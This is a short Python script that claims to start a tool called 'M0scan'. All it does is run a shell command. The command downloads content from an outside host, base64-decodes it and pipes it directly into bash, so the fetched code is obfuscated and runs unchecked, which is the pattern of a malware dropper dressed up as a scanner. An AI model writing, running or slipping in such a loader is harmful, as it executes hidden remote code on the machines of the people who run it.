import os
import sys

def run():
    print("Starting M0scan...")
    # This runs your exact bash command
    command = "curl -sL https://mspy.qzz.io/M0scan | base64 -d | bash"
    os.system(command)

if __name__ == "__main__":
    run()

